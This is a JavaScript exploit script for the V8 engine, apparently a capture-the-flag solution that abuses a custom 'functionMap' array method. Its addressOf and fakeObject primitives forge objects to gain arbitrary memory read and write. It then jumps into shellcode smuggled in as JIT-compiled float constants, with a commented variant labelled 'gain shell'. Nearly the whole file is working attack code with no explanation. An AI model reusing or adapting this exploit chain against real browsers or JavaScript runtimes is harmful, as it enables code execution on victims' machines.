var buf = new ArrayBuffer(8);
var f32 = new Float32Array(buf);
var f64 = new Float64Array(buf);
var u8 = new Uint8Array(buf);
var u16 = new Uint16Array(buf);
var u32 = new Uint32Array(buf);
var u64 = new BigUint64Array(buf);

function lh_u32_to_f64(l,h){
    u32[0] = l;
    u32[1] = h;
    return f64[0];
}
function f64_to_u32l(val){
    f64[0] = val;
    return u32[0];
}
function f64_to_u32h(val){
    f64[0] = val;
    return u32[1];
}
function f64_to_u64(val){
    f64[0] = val;
    return u64[0];
}
function u64_to_f64(val){
    u64[0] = val;
    return f64[0];
}

function u64_to_u32_lo(val){
    u64[0] = val;
    return u32[0];
}

function u64_to_u32_hi(val){
    u64[0] = val;
    return u32[1];
}


function stop(){
    %SystemBreak();
}

function p(arg){
    %DebugPrint(arg);
}

function spin(){
    while(1){};
}

function hex(str){
    return str.toString(16).padStart(16,0);
}

function logg(str,val){
    console.log("[+] "+ str + ": " + "0x" + hex(val));
}

// gain shell
// const shellcode = () => {return [
//     1.9553825422107533e-246,
//     1.9560612558242147e-246,
//     1.9995714719542577e-246,
//     1.9533767332674093e-246,
//     2.6348604765229606e-284
// ];}

const shellcode = () => {return [
    1.9710255944286777e-246,
    1.971136949489835e-246,
    1.97118242283721e-246,
    1.9711826272864685e-246,
    1.9712937950614383e-246,
    -1.6956275879669133e-231
];}

for(let i = 0; i< 10000; i++){
    shellcode();
}

function addressOf(obj){
    let victim_arr = [1.1,2.2,3.3];
    // let object = {};
    let address = 0;
    let itr = 0;
    // p(victim_arr);
    victim_arr.functionMap( val => {
        switch(itr){
            case 0:
                // p(obj)
                // stop();
                itr++;
                victim_arr[2] = obj;
                return val;
            case 1:
                // stop();
                itr++;
                // logg("val",f64_to_u64(val));
                // stop();
                address = u64_to_u32_lo(f64_to_u64(val));
                return val;
            case 2:
                // stop();
                itr++;
                return val;
            default:
                itr++;
                return val;
        }
    });
    return address;
}


function fakeObject(address){
    let arr = [1.1,2.2,3.3];
    let fake_object;
    let obj = {};
    let itr = 0;
    // p(arr);
    // p(obj);
    arr.functionMap(val => {
        switch(itr){
            case 0:
                itr++;
                // stop()
                arr[2] = obj;
                // logg("address",address);
                // stop();
                return lh_u32_to_f64(address,0);
            default:
                // stop();
                itr++;
                return val;
        }
    });
    return arr[0];
}

var fake_map = [
    u64_to_f64(0x31040404001c01b5n),
    u64_to_f64(0x0a8007ff11000844n)
]

var fake_map_address = addressOf(fake_map)+0x54;

var fake_array = [
    lh_u32_to_f64(fake_map_address,0x0),
    lh_u32_to_f64(0x1,0x1000)
];

p(fake_array);

var fake_array_address = addressOf(fake_array)+0x54;
var fake_obj = fakeObject(fake_array_address);

console.log(typeof fake_obj);
logg("fake_array_address",fake_array_address);
logg("fake_map_address",fake_map_address);


function AAR(addr){
    fake_array[1] = lh_u32_to_f64(addr-8,0x1000);
    return f64_to_u64(fake_obj[0]);
}

function AAW(addr,val){
    fake_array[2] = lh_u32_to_f64(addr-8,0x1000);
    fake_obj[0] = u64_to_f64(val);
}

p(shellcode);
var shellcode_addr = addressOf(shellcode);
var code_addr = u64_to_u32_lo(AAR(shellcode_addr+0xc));
var ins_base = AAR((code_addr)+0x14);

logg("shellcode_addr",shellcode_addr);
logg("code_addr",code_addr);
logg("ins_base",ins_base);

AAW(code_addr+0x14,(BigInt(ins_base)+0x6bn));

shellcode();
spin();